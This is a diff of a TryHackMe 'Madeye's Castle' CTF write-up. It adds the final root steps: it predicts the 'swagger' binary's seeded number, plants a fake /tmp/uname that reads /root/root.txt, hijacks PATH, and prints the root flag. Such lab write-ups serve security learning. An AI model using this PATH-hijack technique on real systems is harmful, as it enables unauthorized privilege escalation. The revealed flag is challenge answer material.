@@ -1,8 +1,11 @@
 <h1 align="center">Madeye´s Castle<br><img width="1200px" src="https://github.com/user-attachments/assets/4a65adbb-2ce3-4c4b-a838-2ca5feb3a87d"></h1>
-<p align="center">June 18, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>408</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
+<p align="center">July 21, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>441</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
 <em>A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja.</em><br>
 Click <a href="https://tryhackme.com/room/madeyescastle">here </a>to access the "room".<br>
 <img width="80px" src="https://github.com/user-attachments/assets/04450265-813a-469a-a168-a914f2932e65"><br></p>
+
+<img width="1897" height="381" alt="image" src="https://github.com/user-attachments/assets/b1f6a2c7-73b3-41e4-beb6-c4e88ea21f18" />
+
 
 
 
@@ -324,18 +327,63 @@ hermonine@ip-10-10-234-114:~$ /srv/time-turner/swagger
 Guess my number: 22222
 Nope, that is not what I was thinking
 I was thinking of 1214357373
-hermonine@ip-10-10-234-114:~$
 ```
 
 
+```bash
+hermonine@ip-10-10-50-150:/srv/time-turner$ ./swagger
+Guess my number: 3444
+Nope, that is not what I was thinking
+I was thinking of 1222766762
+hermonine@ip-10-10-50-150:/srv/time-turner$ for i in $(seq 1 4) ; do echo 123 | ./swagger ; done
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1390435195
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1390435195
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1390435195
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1390435195
+hermonine@ip-10-10-50-150:/srv/time-turner$ ./swagger| grep -oE '[0-9]+' | ./swagger
+Guess my number: Nice use of the time-turner!
+This system architecture is x86_64
+hermonine@ip-10-10-50-150:/srv/time-turner$ echo 1234 | ./swagger | tr -dc '0-9' | ./swagger 
+Guess my number: Nice use of the time-turner!
+This system architecture is x86_64
+hermonine@ip-10-10-50-150:/srv/time-turner$ cd /tmp
+hermonine@ip-10-10-50-150:/tmp$ cat > ros << EOF
+> #!/bin/bash
+> cat /root/root.txt
+> EOF
+hermonine@ip-10-10-50-150:/tmp$ ls
+snap-private-tmp
+systemd-private-aafaa869e135493c9a019cd85b42bd50-apache2.service-NLU2Mh
+systemd-private-aafaa869e135493c9a019cd85b42bd50-ModemManager.service-h86Zrh
+systemd-private-aafaa869e135493c9a019cd85b42bd50-systemd-logind.service-N8KzEg
+systemd-private-aafaa869e135493c9a019cd85b42bd50-systemd-resolved.service-wQnQ0e
+systemd-private-aafaa869e135493c9a019cd85b42bd50-systemd-timesyncd.service-hMzUOg
+uname
+hermonine@ip-10-10-50-150:/tmp$ chmod +x uname
+hermonine@ip-10-10-50-150:/tmp$ export PATH=/tmp:$PATH
+hermonine@ip-10-10-50-150:/tmp$ echo 1234 | /srv/time-turner/swagger | tr -dc '0-9' | /srv/time-turner/swagger
+Guess my number: Nice use of the time-turner!
+This system architecture is RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
+```
+
+<br>
+
 > 1.3. <em>Root.txt</em><br><a id='1.3'></a>
->> <strong><code>_____________________</code></strong><br>
+>> <strong><code>RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}</code></strong><br>
 <p></p>
 
-![image](https://github.com/user-attachments/assets/13068776-c9e5-48da-ba82-b123341ae60f)
+<br>
+<br>
 
-![image](https://github.com/user-attachments/assets/4abfb4c4-0e6c-4a94-afc2-64c024837edd)
 
-![image](https://github.com/user-attachments/assets/e175eaae-7f53-4985-86cd-f64473da481c)
+<img width="1906" height="869" alt="image" src="https://github.com/user-attachments/assets/3ffd208c-f97e-483c-a730-131db95e9392" />
+
+<img width="1907" height="896" alt="image" src="https://github.com/user-attachments/assets/d6deb23f-a53c-415c-ada2-4ac1f35079ff" />
+
+<br>
 
 
